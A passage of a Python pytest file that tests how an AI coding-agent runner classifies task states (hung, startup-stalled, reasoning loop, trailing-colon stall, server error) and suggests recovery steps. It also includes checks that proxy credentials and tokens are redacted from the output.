        (td / "failure-status.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "reason": "opencode_server_error",
                    "phase": "pre_useful_work",
                    "upstream_ref": "err_bf7ae62d",
                    "correlation_hint": "Correlate OpenCode server logs with upstream ref err_bf7ae62d",
                    "observed_at": "2026-09-08T06:32:33+00:00",
                }
            ),
            encoding="utf-8",
        )
        os.utime(td / "agent-status.md", (now - 700, now - 700))
        os.utime(td / "opencode-output.log", (now - 1, now - 1))
        os.utime(td / "failure-status.json", (now - 1, now - 1))

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "opencode_server_error"
        assert result["failure"]["reason"] == "opencode_server_error"
        assert result["failure"]["phase"] == "pre_useful_work"
        assert result["failure"]["upstream_ref"] == "err_bf7ae62d"
        assert result["last_useful_activity"] == {
            "source": None,
            "mtime_epoch": None,
            "age_seconds": None,
        }
        assert result["log_included"] is False
        assert "must-not-be-read" not in str(result)

    def test_invalid_server_error_sidecar_is_fail_honest_and_does_not_leak(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: failed\n", encoding="utf-8")
        (td / "failure-status.json").write_text(
            json.dumps(
                {
                    "reason": "opencode_server_error",
                    "phase": "pre_useful_work",
                    "upstream_ref": "https://secret.invalid/?token=should-not-leak",
                    "correlation_hint": "token=should-not-leak",
                }
            ),
            encoding="utf-8",
        )

        result = agent_task_status(
            self._shell_runner(tmp_path), project="my-proj", task_id=task_id
        )

        assert result["terminal"] is True
        assert result["verdict"] == "finished"
        assert result["failure"]["valid"] is False
        serialized = json.dumps(result, ensure_ascii=False)
        assert "secret.invalid" not in serialized
        assert "should-not-leak" not in serialized

    def test_terminal_snapshot_points_to_report_and_diff(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: needs-review\n", encoding="utf-8")
        (td / "agent-report.md").write_text("done\n", encoding="utf-8")
        (td / "implementation-diff.patch").write_text("diff --git a/a b/a\n", encoding="utf-8")

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
        )

        assert result["verdict"] == "finished"
        assert result["terminal"] is True
        assert result["next"]["read_agent_report"] == {"project": "my-proj", "task_id": task_id}
        assert result["next"]["read_agent_diff"] == {"project": "my-proj", "task_id": task_id}

    def test_ambiguous_gateway_job_is_terminal_despite_fresh_heartbeat(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}
            ),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        os.utime(td / "agent-heartbeat.json", (now - 5, now - 5))

        result = agent_task_status(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "ambiguous"},
        )

        assert result["job"]["status"] == "ambiguous"
        assert result["runner_heartbeat_fresh"] is True
        assert result["terminal"] is True
        assert result["likely_hung"] is False
        assert result["verdict"] == "finished"
        assert "job_status" not in result["next"]
        assert result["next"]["read_agent_report"] == {
            "project": "my-proj",
            "task_id": task_id,
        }
        assert result["next"]["read_agent_diff"] == {
            "project": "my-proj",
            "task_id": task_id,
        }


class TestAgentStartupDiagnostics:
    @staticmethod
    def _diagnose(*, proxy_status=None, report_size=0, diff_size=0):
        from examples.mcp_server.agent_tasks import _agent_startup_diagnostics

        return _agent_startup_diagnostics(
            status="running",
            status_text="Status: running\n",
            log_stdout="",
            files={
                "status": {"exists": True, "size_bytes": 16, "mtime_epoch": 1_900},
                "log": {"exists": True, "size_bytes": 0, "mtime_epoch": 1_900},
                "report": {"exists": True, "size_bytes": report_size, "mtime_epoch": 1_900},
                "diff": {"exists": True, "size_bytes": diff_size, "mtime_epoch": 1_900},
                "proxy_status": {"exists": bool(proxy_status), "size_bytes": 100, "mtime_epoch": 1_995},
            },
            active=True,
            now_epoch=2_000,
            proxy_status=proxy_status or {"exists": False},
        )

    def test_acquired_proxy_is_not_itself_a_startup_stall(self):
        result = self._diagnose(
            proxy_status={
                "exists": True,
                "valid": True,
                "attempt": 1,
                "max_attempts": 4,
                "final_outcome": "acquired",
            }
        )

        assert result["opencode_startup_stalled"] is False
        assert result["useful_agent_activity_seen"] is False
        assert result["dead_time_kind"] is None
        assert result["proxy_rotation"]["observed"] is True
        assert result["proxy_rotation"]["sidecar"] is True

    def test_running_proxy_outcome_is_explicit_useful_runtime_evidence(self):
        result = self._diagnose(
            proxy_status={
                "exists": True,
                "valid": True,
                "attempt": 2,
                "max_attempts": 4,
                "final_outcome": "running",
            }
        )

        assert result["opencode_startup_stalled"] is False
        assert result["useful_agent_activity_seen"] is True
        assert result["dead_time_kind"] is None

    def test_single_attempt_upstream_error_exhaustion_remains_startup_dead_time(self):
        result = self._diagnose(
            proxy_status={
                "exists": True,
                "valid": True,
                "attempt": 1,
                "max_attempts": 1,
                "last_error_class": "opencode_server_error",
                "final_outcome": "upstream_error_exhausted",
            }
        )

        assert result["opencode_startup_stalled"] is True
        assert result["useful_agent_activity_seen"] is False
        assert result["dead_time_kind"] == "opencode_startup"
        assert result["phase"] == "startup"

    def test_zero_byte_terminal_artifacts_do_not_prove_useful_work(self):
        result = self._diagnose(report_size=0, diff_size=0)

        assert result["useful_agent_activity_seen"] is False


class TestInspectAgentTask:
    @staticmethod
    def _shell_runner(cwd):
        def run_cmd(_project: str, command: str) -> dict:
            result = subprocess.run(
                ["sh", "-c", command],
                cwd=cwd,
                text=True,
                capture_output=True,
                check=False,
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "exit_code": result.returncode,
            }

        return run_cmd

    def test_missing_task_returns_missing_verdict(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id="a12345678901",
        )
        assert result["exists"] is False
        assert result["verdict"] == "missing"
        assert result["likely_hung"] is False

    def test_running_job_with_old_artifacts_is_likely_hung(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("line 1\nline 2\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"},
                sort_keys=True,
            ),
            encoding="utf-8",
        )
        old = 1_000
        for child in td.iterdir():
            os.utime(child, (old, old))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            tail_lines=1,
            stale_after_seconds=600,
            now_epoch=2_000,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["exists"] is True
        assert result["status"] == "running"
        assert result["job"]["status"] == "running"
        assert result["last_activity"]["age_seconds"] == 1_000
        assert result["verdict"] == "likely_hung"
        assert result["likely_hung"] is True
        assert result["log"]["stdout"] == "line 2\n"

    def test_fresh_log_cannot_mask_stale_semantic_progress(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "\n".join(
                [
                    "allocator provisioned fresh provider tunnel",
                    "router elected primary gateway control",
                    "runner flushed periodic metric snapshot",
                    "shell echoed diagnostic status block",
                    "executor wrote compact audit digest",
                    "bridge recorded bounded relay event",
                    "session renewed short lifecycle credential",
                    "transport recovered idle socket binding",
                    "queue drained buffered forward message",
                    "registry refreshed cached artifact references",
                    "listener closed completed health probe",
                    "proxy ratified stable upstream channel",
                    "worker observed constant backpressure level",
                    "wrapper verified container image signature",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}
            ),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        os.utime(td / "opencode-output.log", (now - 1, now - 1))
        os.utime(td / "agent-heartbeat.json", (now - 5, now - 5))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["runner_heartbeat_fresh"] is True
        assert result["last_activity"]["age_seconds"] == 1
        assert result["last_useful_activity"]["age_seconds"] == 700
        assert result["likely_hung"] is True
        assert result["verdict"] == "likely_hung"

    def test_fresh_semantic_progress_stays_running(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nWorking\n", encoding="utf-8")
        (td / "consensus.md").write_text("# Agent consensus\n\nChecks are running.\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("line 1\nline 2\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps(
                {"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 700, now - 700))
        os.utime(td / "agent-status.md", (now - 5, now - 5))
        os.utime(td / "consensus.md", (now - 5, now - 5))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["last_useful_activity"]["age_seconds"] == 5
        assert result["likely_hung"] is False
        assert result["verdict"] == "running"

    def test_job_not_found_for_stale_running_task_is_lost_after_restart_not_worker_terminated(
        self, tmp_path, monkeypatch
    ):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nStill working.\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "Ran targeted tests before the Gateway restart.\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 900, now - 900))

        def lost_job_status(job_id):
            raise RuntimeError(f"JOB_NOT_FOUND for {job_id}")

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lost_job_status,
        )

        assert result["verdict"] == "lost_after_restart"
        assert result["terminal"] is False
        assert result["likely_hung"] is True
        assert result["job"]["known"] is False
        assert result["job"]["error_code"] == "JOB_NOT_FOUND"
        assert result["job"]["gateway_job_absent"] is True
        assert result["job"]["worker_termination_proven"] is False
        assert result["reconciliation"]["state"] == "lost_after_restart"
        assert result["reconciliation"]["attempt_bound_job"] is True
        assert result["reconciliation"]["artifact_incomplete"] is True
        assert result["reconciliation"]["worker_termination_proven"] is False
        assert result["recovery"]["action"] == "inspect_artifacts_then_retry_with_new_task_id"
        assert "cancel_agent_task" not in result["recovery"]

    def test_terminal_server_error_sidecar_is_returned_by_deep_inspection(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: failed\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            'Error: {"name":"UnknownError","data":{"message":"Unexpected server error. Check server logs for details.","ref":"err_bf7ae62d"}}\n',
            encoding="utf-8",
        )
        (td / "failure-status.json").write_text(
            json.dumps(
                {
                    "reason": "opencode_server_error",
                    "phase": "pre_useful_work",
                    "upstream_ref": "err_bf7ae62d",
                    "correlation_hint": "Correlate OpenCode server logs with upstream ref err_bf7ae62d",
                }
            ),
            encoding="utf-8",
        )
        # The runner always emits these terminal artifacts, even when OpenCode
        # failed before doing any useful work. Their mere existence must not
        # be treated as evidence that model/tool activity happened.
        (td / "agent-report.md").write_text("# Agent Runner Result\n", encoding="utf-8")
        (td / "implementation-diff.patch").write_text("", encoding="utf-8")
        os.utime(td / "agent-status.md", (now - 700, now - 700))
        os.utime(td / "opencode-output.log", (now - 1, now - 1))
        os.utime(td / "failure-status.json", (now - 1, now - 1))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=now,
        )

        assert result["terminal"] is True
        assert result["verdict"] == "opencode_server_error"
        assert result["failure"] == {
            "exists": True,
            "valid": True,
            "reason": "opencode_server_error",
            "phase": "pre_useful_work",
            "upstream_ref": "err_bf7ae62d",
            "correlation_hint": "Correlate OpenCode server logs with upstream ref err_bf7ae62d",
        }
        assert result["last_activity"]["age_seconds"] <= 1
        assert result["last_useful_activity"] == {
            "source": None,
            "mtime_epoch": None,
            "age_seconds": None,
        }
        assert result["startup"]["useful_agent_activity_seen"] is False
        assert result["recovery"] == {
            "action": "retry_with_new_task_id",
            "retry_agent_task": {
                "project": "my-proj",
                "source_task_id": task_id,
                "retry_task_id": "<new-task-id>",
                "requires_new_task_id": True,
            },
            "run_agent": {"project": "my-proj", "task_id": "<new-task-id>"},
        }

    def test_terminal_status_is_finished_even_with_old_logs(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: needs-review\n", encoding="utf-8")
        (td / "opencode-output.log").write_text("done\n", encoding="utf-8")
        for child in td.iterdir():
            os.utime(child, (1_000, 1_000))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            now_epoch=10_000,
        )

        assert result["verdict"] == "finished"
        assert result["terminal"] is True
        assert result["likely_hung"] is False

    def test_rejects_invalid_stale_threshold_before_commands(self):
        calls = []
        with pytest.raises(ValueError):
            inspect_agent_task(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                stale_after_seconds=59,
            )
        assert calls == []

    def test_running_startup_proxy_rotation_is_not_plain_running(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {
                    "stdout": (
                        "Status: running\n"
                        "Using exclusive live proxy from configured provider\n"
                        "OpenCode startup stalled; rotating proxy (attempt 3/4)\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "Using exclusive live proxy from configured provider\n"
                        "OpenCode startup stalled; rotating proxy (attempt 2/4)\n"
                        "OpenCode startup stalled; rotating proxy (attempt 3/4)\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 90}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "startup_stalled"
        assert result["likely_hung"] is False
        assert result["startup"] == {
            "phase": "startup",
            "elapsed_seconds": 90,
            "last_startup_message": "OpenCode startup stalled; rotating proxy (attempt 3/4)",
            "startup_timeout": False,
            "opencode_startup_stalled": True,
            "proxy_rotation": {
                "observed": True,
                "attempt": 3,
                "max_attempts": 4,
                "count": 3,
                "sidecar": False,
            },
            "useful_agent_activity_seen": False,
            "dead_time_kind": "opencode_startup",
        }

    def test_startup_stall_with_useful_agent_work_remains_running(self):
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "OpenCode startup stalled; rotating proxy (attempt 1/4)\n"
                        "← Write agent-report.md\n"
                        "Wrote file successfully.\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 30}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "running"
        assert result["startup"]["opencode_startup_stalled"] is True
        assert result["startup"]["useful_agent_activity_seen"] is True
        assert result["startup"]["dead_time_kind"] is None

    def test_startup_stall_with_real_tool_read_activity_remains_running(self):
        """A model/tool turn proves startup completed even before artifacts change."""
        now = 2_000

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {
                    "stdout": (
                        "Status: running\n"
                        "Using exclusive live proxy from configured provider\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {
                    "stdout": (
                        "> build · big-pickle\n"
                        "OpenCode startup stalled; rotating proxy (attempt 1/4)\n"
                        "→ Read <agent-task>/current-plan.md\n"
                        "→ Read examples/mcp_server/agent_tools.py\n"
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                return {"stdout": f"20 {now - 300}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "running"
        assert result["startup"]["opencode_startup_stalled"] is True
        assert result["startup"]["useful_agent_activity_seen"] is True
        assert result["startup"]["dead_time_kind"] is None
        assert result["startup"]["phase"] is None

    def test_proxy_status_sidecar_is_sanitized_and_keeps_startup_visible(self):
        now = 2_000
        raw_proxy_url = "http://user:pass@proxy.local:8080?token=raw-token"

        def fake_run_cmd(project: str, command: str) -> dict:
            if command.startswith("ls -ld -- "):
                return {"stdout": "drwxr-xr-x 1 user user 0 path\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "agent-status.md" in command:
                return {"stdout": "Status: running\n", "stderr": "", "exit_code": 0}
            if command.startswith("cat ") and "attempt-state.json" in command:
                return {
                    "stdout": json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat ") and "proxy-status.json" in command:
                return {
                    "stdout": json.dumps(
                        {
                            "attempt": 4,
                            "max_attempts": 5,
                            "provider_kind": "exclusive-live",
                            "last_error_class": f"ProxyError via {raw_proxy_url}",
                            "final_outcome": "rotating",
                            "updated_epoch": now - 5,
                            "proxy_url": raw_proxy_url,
                            "access_token": "top-secret-token",
                        }
                    ),
                    "stderr": "",
                    "exit_code": 0,
                }
            if command.startswith("cat "):
                return {"stdout": "(not found)", "stderr": "", "exit_code": 1}
            if command.startswith("tail -c "):
                return {"stdout": "Waiting for provider allocation\n", "stderr": "", "exit_code": 0}
            if command.startswith("stat -c "):
                if "agent-report.md" in command or "implementation-diff.patch" in command:
                    return {"stdout": "", "stderr": "not found", "exit_code": 1}
                if "proxy-status.json" in command:
                    return {"stdout": f"400 {now - 5}\n", "stderr": "", "exit_code": 0}
                return {"stdout": f"20 {now - 700}\n", "stderr": "", "exit_code": 0}
            return {"stdout": "", "stderr": "", "exit_code": 1}

        result = inspect_agent_task(
            fake_run_cmd,
            project="my-proj",
            task_id="a12345678901",
            stale_after_seconds=600,
            now_epoch=now,
            job_status=lambda _job: {"status": "running"},
        )

        assert result["verdict"] == "startup_stalled"
        assert result["startup"]["phase"] == "startup"
        assert result["startup"]["elapsed_seconds"] == 700
        assert result["startup"]["last_startup_message"] == "proxy error class: ProxyError via <redacted-url>"
        assert result["startup"]["proxy_rotation"] == {
            "observed": True,
            "attempt": 4,
            "max_attempts": 5,
            "count": 0,
            "sidecar": True,
        }
        assert result["proxy_status"]["redacted_fields"] == ["access_token", "proxy_url"]
        serialized = json.dumps(result, ensure_ascii=False)
        assert "user:pass" not in serialized
        assert "proxy.local" not in serialized
        assert "raw-token" not in serialized
        assert "top-secret-token" not in serialized
        assert result["last_activity"]["source"] != "proxy_status"
        assert result["last_useful_activity"]["source"] == "status"


    def test_running_repetitive_reasoning_without_progress_is_reasoning_loop(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n\nVerification phase.\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(
            "\n".join(
                [
                    "I should execute the verification gates now.",
                    "Let me run the tests and checks together.",
                    "I'll run ruff, mypy, compileall, and diff check.",
                    "I need to execute the full gate set.",
                    "Давай запущу все проверки сейчас.",
                    "I will run the required verification batch.",
                    "Let me execute the tests and static checks.",
                    "I should run the checks in one batch.",
                    "I'll verify with tests, ruff and mypy.",
                    "I need to run all required checks now.",
                    "Давай снова проверю тесты и статические проверки.",
                    "I will run the full verification batch.",
                ]
            )
            + "\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "loop",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 1, now - 1))
        for name in ("agent-status.md", "attempt-state.json"):
            os.utime(td / name, (now - 500, now - 500))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["verdict"] == "reasoning_loop"
        assert result["likely_hung"] is True
        assert result["runner_heartbeat_fresh"] is True
        assert result["reasoning_loop"]["detected"] is True
        assert result["reasoning_loop"]["continuation_prompt"] == "Продолжай"
        assert result["recovery"]["action"] == "cancel_and_retry_with_continuation"
        assert result["recovery"]["retry_agent_task"]["continuation_prompt"] == "Продолжай"

    def test_recent_progress_artifact_suppresses_reasoning_loop(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        loop_text = "\n".join(["I will run the verification checks now."] * 12) + "\n"
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        (td / "opencode-output.log").write_text(loop_text, encoding="utf-8")
        (td / "consensus.md").write_text("# Agent consensus\n\nChecks are actually running.\n", encoding="utf-8")
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))
        os.utime(td / "opencode-output.log", (now - 1, now - 1))
        os.utime(td / "consensus.md", (now - 10, now - 10))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["verdict"] == "running"
        assert result["reasoning_loop"]["detected"] is False
        assert "recovery" not in result

    def test_rejects_invalid_reasoning_loop_threshold_before_commands(self):
        calls = []
        with pytest.raises(ValueError):
            inspect_agent_task(
                lambda project, command: calls.append((project, command)),
                project="my-proj",
                task_id="a12345678901",
                reasoning_loop_after_seconds=29,
            )
        assert calls == []

    def test_trailing_colon_without_progress_is_trailing_colon_stall(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
        task_id = "a12345678901"
        now = 2_000
        td = tmp_path / ".ai-bridge" / "tasks" / task_id
        td.mkdir(parents=True)
        (td / "agent-status.md").write_text("Status: running\n", encoding="utf-8")
        # Log tail ends on a narrator colon announcing the next step, then no
        # content follows. Progress artifacts (status/log) are old.
        (td / "opencode-output.log").write_text(
            "Now the test-only CI workflow (no build-and-push, no deploy):\n",
            encoding="utf-8",
        )
        (td / "attempt-state.json").write_text(
            json.dumps({"attempt_id": "attempt-1", "fingerprint": "fp", "job_id": "job-1"}),
            encoding="utf-8",
        )
        (td / "agent-heartbeat.json").write_text(
            json.dumps(
                {
                    "version": 1,
                    "state": "running",
                    "phase": "stall",
                    "updated_at": "2026-09-03T12:00:00Z",
                    "updated_epoch": now - 5,
                    "runner_pid": 123,
                    "exit_code": None,
                }
            ),
            encoding="utf-8",
        )
        for child in td.iterdir():
            os.utime(child, (now - 500, now - 500))
        os.utime(td / "opencode-output.log", (now - 500, now - 500))
        os.utime(td / "agent-status.md", (now - 500, now - 500))

        result = inspect_agent_task(
            self._shell_runner(tmp_path),
            project="my-proj",
            task_id=task_id,
            stale_after_seconds=600,
            reasoning_loop_after_seconds=60,
            trailing_colon_after_seconds=60,
            now_epoch=now,
            job_status=lambda job_id: {"job_id": job_id, "status": "running"},
        )

        assert result["verdict"] == "trailing_colon_stall"
        assert result["likely_hung"] is True
        assert result["trailing_colon_stall"]["detected"] is True
        assert result["trailing_colon_stall"]["last_meaningful_line"] == (
            "Now the test-only CI workflow (no build-and-push, no deploy):"
        )
        assert result["trailing_colon_stall"]["progress_age_seconds"] == 500
        assert result["trailing_colon_stall"]["continuation_prompt"] == "Продолжай"
        assert result["recovery"]["action"] == "cancel_and_retry_with_continuation"
        assert result["recovery"]["retry_agent_task"]["continuation_prompt"] == "Продолжай"

    def test_fresh_progress_artifact_suppresses_trailing_colon_stall(self, tmp_path, monkeypatch):
        monkeypatch.delenv("MCP_AGENT_STATE_ROOT", raising=False)
